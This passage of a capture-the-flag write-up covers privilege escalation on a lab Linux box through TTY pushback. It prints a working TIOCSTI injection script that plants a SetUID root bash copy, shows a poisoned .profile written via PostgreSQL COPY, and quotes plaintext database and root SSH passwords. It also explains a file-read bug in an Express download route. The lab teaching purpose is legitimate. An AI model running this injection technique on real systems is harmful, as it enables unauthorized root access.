 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(4 rows)

```

The current database (download) has three tables:

```
download=> \dt
               List of relations
 Schema |        Name        | Type  |  Owner
--------+--------------------+-------+----------
 public | File               | table | download
 public | User               | table | download
 public | _prisma_migrations | table | download
(3 rows)

```

For some very weird reason I can’t explain, to interact with a table I must put it in double quotes:

```
download=> select * from File;
ERROR:  relation "file" does not exist
LINE 1: select * from File;
                      ^
download=> select * from "File";
                  id                  |             name              |  size  | private |       uploadedAt        | authorId
--------------------------------------+-------------------------------+--------+---------+-------------------------+----------
 05336516-8156-4686-8064-f64ac80e4a07 | VacationIdeas.doc             | 503296 | f       | 2023-04-21 16:03:33.075 |        5
 4f764028-3572-4a14-b4d0-37f5c41dc43b | MonthlyBills.xlsx             |  83418 | f       | 2023-04-21 16:03:33.11  |        9
 27601d6c-a3d2-41e7-b3bc-d2b58902a2ae | RecipeBooklet.pdf             |   3028 | f       | 2023-04-21 16:03:33.138 |       13
 fe0ad4df-444e-4c21-ba47-ba829b885339 | InvestmentPortfolio.pdf       |   3028 | f       | 2023-04-21 16:03:33.181 |       11
 abc0b7ba-7519-4b96-889b-0b932b048c68 | MedicalRecords.pdf            |   3028 | f       | 2023-04-21 16:03:33.218 |       12
 6b6a5a35-42da-4e86-b767-6bb23ee65383 | Resume2023.pdf                |   3028 | f       | 2023-04-21 16:03:33.241 |        2
 a0869ca4-c246-4eb3-8493-28539e369216 | SocialMediaAnalytics.xlsx     |  83418 | f       | 2023-04-21 16:03:33.261 |        7
 5dbc5969-72d7-4b39-abcd-bf0cb0e544fa | SafetyManual.pdf              |   3028 | t       | 2023-04-21 16:03:33.3   |        1
 2dbb9847-af3e-4641-ae48-913214751280 | GraduationProgram.pdf         |   3028 | t       | 2023-04-21 16:03:33.323 |        6
 16c8f92d-d0b2-48a7-bb26-a223b98cbc85 | ResearchPaperHistoryOfArt.doc | 503296 | f       | 2023-04-21 16:03:33.345 |       14
 35d67767-0a4f-4f61-9a6d-1fbf60f164a0 | PersonalDevelopmentPlan.doc   | 503296 | f       | 2023-04-21 16:03:33.38  |        3
 29e63436-0429-4a0c-8f5b-4e3217dea96c | VolunteerSignups.xlsx         |  83418 | f       | 2023-04-21 16:03:33.408 |       11
 aa162ba2-aebe-4d74-9eb0-ff46ca5e286d | AnnualReport2022.pdf          |   3028 | f       | 2023-04-21 16:03:33.429 |        1
 c6fe3018-fc13-41f5-8858-9dedcbe521ee | ConferenceBudget.xlsx         |  83418 | t       | 2023-04-21 16:03:33.449 |       13
 033bd701-e66c-40ce-9e7f-6045427d8450 | NewBusinessIdea.doc           | 503296 | t       | 2023-04-21 16:03:33.476 |        5
 746d90cc-cba1-453c-8e58-d91fe08e8830 | StudySchedule.doc             | 503296 | f       | 2023-04-21 16:03:33.503 |        4
 02a2d809-387d-463a-a2a9-35d2408ec9b5 | EventBudget.xlsx              |  83418 | t       | 2023-04-21 16:03:33.525 |        2
 1f8b5423-9ecb-450b-b668-9268aac79c73 | ContractAgreement.pdf         |   3028 | f       | 2023-04-21 16:03:33.561 |        2
 93693f89-30b6-4e85-9d6a-09e02abb6dc6 | EmployeeSchedule.xlsx         |  83418 | t       | 2023-04-21 16:03:33.589 |       15
 c97b91b1-e8dd-4b11-8e4b-62158d10408b | BookClubReadingList.doc       | 503296 | f       | 2023-04-21 16:03:33.617 |       13
 f021eb3d-cff4-4b7f-b63f-938108257d76 | WeeklyJournal.doc             | 503296 | f       | 2023-04-21 16:03:33.641 |       12
 2234eba4-0698-4ef1-a1e0-4031d5dff8d7 | DreamHomeDesign.doc           | 503296 | t       | 2023-04-21 16:03:33.684 |        3
 86e3ec57-9332-4e9b-95ba-900ff06781f3 | WeddingInvitation.pdf         |   3028 | t       | 2023-04-21 16:03:33.702 |       10
(23 rows)

```

There’s not anything new here either.

#### Processes

Looking at the running processes, on constantly running process is a Python script, `management.py`:

```
wesley@download:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
root        1015  1.6  0.7 1359704 28872 ?       Ssl  22:06   1:04 /root/venv/bin/python3 /root/management.py
...[snip]...

```

There is a `management.service` in `/etc/systemd/system`, but it’s only readable by root:

```
wesley@download:~$ ls -l /etc/systemd/system/management.service
-rw------- 1 root root 222 Apr 21  2023 /etc/systemd/system/management.service
wesley@download:~$ cat /etc/systemd/system/management.service
cat: /etc/systemd/system/management.service: Permission denied

```

I’ll upload [pspy](https://github.com/DominicBreuker/pspy) to look for any recurring running jobs. Every so often, there’s an interesting series of processes. It starts with a connection of SSH from root:

```
2023/11/07 23:09:27 CMD: UID=0     PID=6661   | sshd: root [priv]

```

Then there’s a ton of stuff related to root’s getting a shell, running message of the day banners, etc. Then, still in the same second, it runs `./manage-db` (twice for some reason?):

```
2023/11/07 23:09:27 CMD: UID=0     PID=6759   | /bin/bash -i ./manage-db
2023/11/07 23:09:27 CMD: UID=0     PID=6760   | /bin/bash -i ./manage-db

```

It calls `systemctl` a couple times to check the status of services:

```
2023/11/07 23:09:27 CMD: UID=0     PID=6631   | systemctl status postgresql
2023/11/07 23:09:27 CMD: UID=0     PID=6761   | systemctl status download-site

```

Then it calls `su -l postgres` to drop to the postgres user (UID 113), and, after initializing `bash`, does some DB stuff:

```
2023/11/07 23:09:27 CMD: UID=0     PID=6762   | su -l postgres
2023/11/07 23:09:27 CMD: UID=113   PID=6763   | su -l postgres
2023/11/07 23:09:27 CMD: UID=113   PID=6764   | -bash
2023/11/07 23:09:27 CMD: UID=113   PID=6765   |
2023/11/07 23:09:27 CMD: UID=113   PID=6767   | -bash
2023/11/07 23:09:27 CMD: UID=113   PID=6766   | locale
2023/11/07 23:09:32 CMD: UID=113   PID=6768   | /usr/bin/perl /usr/bin/psql
2023/11/07 23:09:32 CMD: UID=113   PID=6769   | /bin/bash /usr/bin/ldd /usr/lib/postgresql/12/bin/psql
2023/11/07 23:09:32 CMD: UID=113   PID=6771   |
2023/11/07 23:09:32 CMD: UID=113   PID=6770   | /bin/bash /usr/bin/ldd /usr/lib/postgresql/12/bin/psql
2023/11/07 23:09:32 CMD: UID=113   PID=6772   |
2023/11/07 23:09:32 CMD: UID=113   PID=6773   | /bin/bash /usr/bin/ldd /usr/lib/postgresql/12/bin/psql
2023/11/07 23:09:32 CMD: UID=113   PID=6775   | /lib64/ld-linux-x86-64.so.2 /usr/lib/postgresql/12/bin/psql
2023/11/07 23:09:32 CMD: UID=113   PID=6774   | /bin/bash /usr/bin/ldd /usr/lib/postgresql/12/bin/psql
2023/11/07 23:09:32 CMD: UID=113   PID=6776   | postgres: 12/main: postgres postgres [local] idle

```

The [man page](https://man7.org/linux/man-pages/man1/su.1.html) for `su` shows `-l` (same as `-` and `--login`) will:

> ```
>  Start the shell as a login shell with an environment similar
>            to a real login:
>
>            •   clears all the environment variables except TERM and
>                variables specified by --whitelist-environment
>
>            •   initializes the environment variables HOME, SHELL, USER,
>                LOGNAME, and PATH
>
>            •   changes to the target user’s home directory
>
>            •   sets argv[0] of the shell to '-' in order to make the
>                shell a login shell
>
> ```

### TTY Pushback

#### Background

There’s an issue known as “TTY pushbash” that has been raised as a security issue [since 1985](https://web.archive.org/web/20031005121525/https://securitydigest.org/unix/archive/015). There are tons of posts about it over the decades as it raises and is forgotten, though it seems to be [being fixed](https://isopenbsdsecu.re/mitigations/tiocsti/) in some distros now (for [example](https://www.openwall.com/lists/oss-security/2023/03/24/4)).

When a privileged process runs `su`, unless it gets `-P/--pty`, the new process lives within the same pseudo-terminal (PTY) as the old one. There is a IOCTL target, `TIOCSTI`, that allows for pushing bytes into the TTY’s (or PTY’s) input queue.

That means if an attacker can run commands from the lower privileged user when the high privileged user drops to that user, they can run commands as the high privileged user. How could that happen? If the attacker can write to a script that runs when the login happens (such as `.profile`), and the privileged user runs `su -` (or `su -l`), then these will be executed as the privileged user.

[This article](https://www.errno.fr/TTYPushback.html) is the most recent post that shows how to execute the attack.

#### POC Analysis

The POC in the blog post is a Python script:

```
#!/usr/bin/env python3
import fcntl
import termios
import os
import sys
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in sys.argv[1] + '\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)

```

It stops the current process (the low priv shell), returning focus to the parent (the root shell). Then it send characters via the ioctl one by one so that they type into the shell the command and then a newline. `0` is the file descriptor for STDIN, and `TIOCSTI` is the ioctl that allows this write.

#### Poison .profile

`.bashrc`, `.profile`, and `.bash_login` all seem like potential files to poison. For some reason, I was able to get this to work with the latter two, but not with `.bashrc`. It’s also important to note that the way the bot runs is to delete all the files in the postgres user’s home directory (presumably to prevent players spoiling for each other), wait 60 seconds, run the code to trigger the exploit, wait 30 seconds, and start again. This means that if I write into postgres’ home directory during that latter 30 seconds, the file will be deleted before the exploit can be triggered.

I’ll create an exploit script at `/dev/shm/poc.py`:

```
#!/usr/bin/env python3
import fcntl
import termios
import os
import sys
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in 'cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)

```

This is like the POC, except my command is just to make a copy of `bash` as `/tmp/0xdf` and make it SetUID / setGID to run as root.

I need a way to write to the `.bashrc` file in the postgres user’s home directory. The home directory is `/var/lib/postgresql`. I can’t write there directly as wesley:

```
wesley@download:~$ echo -e "\n\npython /dev/shm/poc.py\n" >> /var/lib/postgresql/.profile
-bash: /var/lib/postgresql/.bashrc: Permission denied

```

I’ll have to write from the database. I’ll connect with the password “CoconutPineappleWatermelon”:

```
wesley@download:~$ psql -h 127.0.0.1 -U download download
Password for user download:
psql (12.15 (Ubuntu 12.15-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

download=>

```

I’ll use the `COPY` command to write to the `.bashrc`:

```
download=> COPY (select 'python3 /dev/shm/poc.py') TO '/var/lib/postgresql/.profile';
COPY 1

```

It works:

```
wesley@download:~$ cat /var/lib/postgresql/.profile
python3 /dev/shm/poc.py

```

#### Execution

The next time the bot cycles and tries to run, it calls `manage-db` as root, and then drops to UID 113 (postgres). But then it doesn’t call `psql`, rather just doing some `bash` calls and then returning to root:

```
2023/11/08 11:10:57 CMD: UID=0     PID=67907  | systemctl status postgresql
2023/11/08 11:10:57 CMD: UID=0     PID=67908  | /bin/bash -i ./manage-db
2023/11/08 11:10:57 CMD: UID=0     PID=67909  | /bin/bash -i ./manage-db
2023/11/08 11:10:57 CMD: UID=113   PID=67910  | -bash
2023/11/08 11:10:57 CMD: UID=113   PID=67911  |
2023/11/08 11:10:57 CMD: UID=113   PID=67912  | -bash
2023/11/08 11:10:57 CMD: UID=113   PID=67914  | -bash
2023/11/08 11:10:57 CMD: UID=113   PID=67915  |
2023/11/08 11:10:57 CMD: UID=0     PID=67916  | -bash
2023/11/08 11:11:02 CMD: UID=0     PID=67919  | /usr/bin/perl /usr/bin/psql

```

`/tmp/0xdf` is there with the SetUID/SetGID bits on ( `s` instead of `x` for owner and group):

```
wesley@download:~$ ls -l /tmp/0xdf
-rwsrwsrwx 1 root root 1183448 Nov  8 11:10 /tmp/0xdf

```

It provides a shell with root effective IDs and I can read the flag:

```
wesley@download:~$ /tmp/0xdf -p
0xdf-5.0# id
uid=1000(wesley) gid=1000(wesley) euid=0(root) egid=0(root) groups=0(root),1000(wesley)
0xdf-5.0# cat /root/root.txt
c4e14025************************

```

## Beyond Root

### Deeper Into TTY Pushback

#### management.py

As root, I can look at the automations that allow for the TTY Pushback attack. `management.py` is set to run as a service:

```
import paramiko
import time
import os

while True:
    print("Deleting files")

    for file_name in os.listdir("/var/lib/postgresql/"):
        if file_name != "12":
            os.remove(os.path.join("/var/lib/postgresql/", file_name))

    # This gives people 60 seconds to get their payload within .bashrc
    time.sleep(60)

    print("SSHing")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect("localhost", username="root", password="QzN6j#aP#N6!7knrXkN!B$7kq")

    chan = ssh.get_transport().open_session()
    chan.get_pty()
    chan.invoke_shell()
    chan.send(b'/bin/bash -i ./manage-db\n')
    time.sleep(5)
    chan.send(b"psql\n")
    time.sleep(30)

    if not chan.closed:
        chan.close()

```

It does some cleanup in the postgresql user’s home directory, and then sleeps for a minute. Then it SSHes into the box as root, runs `manage-db`, and then connects to Postgres (as the postgres user). Then it sleeps 30 seconds and kills the connection.

#### Setup

To show how the TTY Pushback attack works, I’ll do some demos. With a root shell, I can get the root password from the `management.py` script, and SSH in as root in two different terminals. In the first, I’ll add a long sleep to the end of the wesley user’s `.bashrc` file:

```
root@download:~# tail -1 /home/wesley/.bashrc
sleep 1000

```

#### Demo

In the first shell, I’ll run `su - wesley`. This is what the script does ( `-` is the same as `-l`), and what I typically do when changing users on a Linux machine:

```
root@download:~# su - wesley

```

It hangs, as `.bashrc` is executed, and it therefore sleeps for 1000 seconds.

While this is running, I’ll examine the processes in the other shell.

```
root@download:~# ps -ef --forest
UID          PID    PPID  C STIME TTY          TIME CMD
...[snip]...
root       18959     912  0 01:35 ?        00:00:00  \_ sshd: root@pts/0
root       19045   18959  0 01:35 pts/0    00:00:00  |   \_ -bash
root       19322   19045  0 01:37 pts/0    00:00:00  |       \_ su - wesley
wesley     19323   19322  0 01:37 pts/0    00:00:00  |           \_ -bash
wesley     19333   19323  0 01:37 pts/0    00:00:00  |               \_ sleep 1000
...[snip]...

```

The SSHD process starts `bash` as root. When I run `su - wesley`, that runs as root, but starts another `bash` process (19323) as wesley. The important part to notice here is that all of these processes are running in `pts/0`.

I’ll kill that sleep and exit back to the shell as root. I’ll do the same thing, but this time run `su -P wesley`. The processes look similar:

```
root@download:~# ps -ef --forest
UID          PID    PPID  C STIME TTY          TIME CMD
...[snip]...
root       18959     912  0 01:35 ?        00:00:00  \_ sshd: root@pts/0
root       19045   18959  0 01:35 pts/0    00:00:00  |   \_ -bash
root       20014   19045  0 01:45 pts/0    00:00:00  |       \_ su -P wesley
wesley     20015   20014  0 01:45 pts/2    00:00:00  |           \_ bash
wesley     20022   20015  0 01:45 pts/2    00:00:00  |               \_ sleep 1000
...[snip]...

```

The only difference is that when the new `bash` process (20015) starts as wesley, it starts in a new pseudo-terminal (PTY, or pts). This means that the `TIOCSTI` ioctl can’t communicate back to the `bash` as root (19045).

### File Read Vuln

The file read vulnerability isn’t what I expected. There are no rules for static files in nginx, but rather it’s handled by the app with this code in `/var/www/app/routers/files.js`:

```
router.get("/download/:fileId", async (req, res) => {
    const fileEntry = await client.file.findFirst({
        where: { id: req.params.fileId },
        select: {
            name: true,
            private: true,
            authorId: true,
        },
    });
    if (fileEntry?.private && req.session?.user?.id !== fileEntry.authorId) {
        return res.status(404);
    }
    return res.download(path_1.default.join(uploadPath, req.params.fileId), fileEntry?.name ?? "Unknown");
});

```

`client` is the Prisma ORM, and it’s making a query to the Files table based on the ID pulled from the URL. The resulting query is stored in `fileEntry`.

The bug here is the next check. It is using `?.` as the Optional Chaining operator. This is a way to query into an object where the object might not exist. The author likely intended to have it check for private or different author or not exist, and return 404 for any of those. The problem is, if `fileEntry` does not exist, then `fileEntry?.private` returns False, and it does not 404.

Express routes take a request ( `req`) and response ( `res`) object. Once past the 404, it uses the path library to join the uploads directory with the passed in file id, and returns the raw version of that (with `res.download`).

Because `fileEntry?.name` is False, it returns “Unknown” as the filename:

![image-20231108122757789](https://0xdf.gitlab.io/img/image-20231108122757789.png)





